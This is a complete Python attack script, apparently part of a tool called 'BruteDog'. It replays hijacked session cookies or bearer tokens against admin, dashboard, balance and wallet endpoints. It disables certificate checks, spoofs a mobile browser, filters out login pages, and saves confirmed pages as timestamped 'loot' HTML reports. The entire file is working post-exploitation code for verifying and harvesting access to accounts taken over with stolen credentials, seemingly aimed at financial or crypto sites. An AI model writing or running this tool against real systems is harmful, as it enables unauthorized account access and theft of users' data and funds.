#!/usr/bin/env python3
"""
LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.2
Features:
- Multi-endpoint administrative and dashboard route auto-probing
- Rejects login form shells (prevents false-positive login pages from being marked as loot)
- Live injection of hijacked tokens or cookie jars into protected endpoints
- Automatic timestamped HTML report generation for visual verification via HTML viewers
"""
import sys
import os
import time
import httpx
from urllib.parse import urlsplit

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def save_loot_report(endpoint, status, body):
    """
    Saves the verified response into a clean, standalone timestamped HTML file 
    optimized for viewing in any mobile or desktop HTML viewer.
    """
    timestamp = int(time.time())
    filename = f"session_loot_report_{timestamp}.html"
    
    # If raw JSON, wrap it in a sleek dark-mode container
    if body.strip().startswith("{") or body.strip().startswith("["):
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BruteDog v7.2 — Verified Session Loot</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 900px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
        h2 {{ color: #38bdf8; margin-top: 0; }}
        pre {{ background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #34d399; font-size: 14px; }}
        .meta {{ color: #94a3b8; font-size: 0.9rem; margin-bottom: 1rem; background: #0f172a; padding: 0.5rem 1rem; border-radius: 4px; }}
    </style>
</head>
<body>
    <div class="card">
        <h2>🔓 Verified Session Loot / Data Dump</h2>
        <div class="meta"><strong>Endpoint:</strong> {endpoint} | <strong>Status Code:</strong> {status} | <strong>Timestamp:</strong> {timestamp}</div>
        <h3>Response Payload (JSON):</h3>
        <pre>{body}</pre>
    </div>
</body>
</html>
"""
    else:
        # If it's an HTML dashboard, prepend a subtle red-team badge bar at the top
        badge_bar = f"""
        <div style="background: #0f172a; color: #38bdf8; padding: 12px 20px; font-family: monospace; font-size: 14px; border-bottom: 2px solid #334155; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 9999;">
            <span>🔓 <strong>BruteDog Loot Verified:</strong> {endpoint} [HTTP {status}]</span>
            <span style="color: #34d399;">Access Confirmed ({timestamp})</span>
        </div>
        """
        if "<body" in body:
            html_content = body.replace("<body", f"<body>{badge_bar}", 1)
        else:
            html_content = badge_bar + body

    with open(filename, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    log(f"[+] Successfully exported verified dashboard/balance view to timestamped HTML file: {filename}", "\033[92m")
    return filename

def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    # Priority probe list to bypass login shell wrappers and find the true dashboard
    probe_endpoints = [
        endpoint,
        "/admin/dashboard",
        "/admin/home",
        "/dashboard",
        "/user/dashboard",
        "/api/admin/stats",
        "/api/user/balance"
    ]
    
    # Deduplicate while preserving order
    seen = set()
    targets = [e for e in probe_endpoints if not (e in seen or seen.add(e))]

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    if token:
        headers["Authorization"] = f"Bearer {token}"

    cookies = cookie_dict or {}

    with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
        for ep in targets:
            target_endpoint = f"{base_url}{ep}"
            log(f"\n[***] RED TEAM VERIFICATION: Testing live session against {target_endpoint} [***]", "\033[95m")

            try:
                response = client.get(target_endpoint, headers=headers)
                status = response.status_code
                body = response.text

                # 1. Defend against SPA fallback shells
                is_spa_shell = (
                    "<div id=\"root\"></div>" in body or 
                    "<div id=\"__next\"></div>" in body or 
                    "<div id=\"app\"></div>" in body or
                    len(body.strip()) < 200
                )

                # 2. Defend against login page wrappers (we want the dashboard, not the login form)
                is_login_page = (
                    "admin login" in body.lower() or 
                    "sign in to your account" in body.lower() or
                    'type="password"' in body.lower() and "dashboard" not in body.lower()
                )

                # 3. Look for true post-authentication indicators
                has_auth_indicators = any(k in body.lower() for k in [
                    "dashboard", "user_id", "balance", "total deposit", 
                    "welcome back", "logout", "settings", "cryptobyte", "account", "wallet"
                ])

                if status == 200 and not is_spa_shell and not is_login_page and has_auth_indicators:
                    log(f"[!!!] SUCCESS! Verified True Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
                    save_loot_report(ep, status, body)
                    return True
                else:
                    log(f"[-] Endpoint {ep} returned login form wrapper or unauthenticated state (Status {status}). Probing next...", "\033[93m")

            except Exception as exc:
                log(f"[-] Connection error on {ep}: {exc}", "\033[91m")

    log("[-] All target endpoints returned login wrappers or invalid states. Session needs further privilege escalation.", "\033[91m")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 live_login_verifier.py <target_url> [endpoint]")
        sys.exit(1)
    
    target = sys.argv[1]
    ep = sys.argv[2] if len(sys.argv) > 2 else "/admin"
    execute_live_login_verification(target, ep)
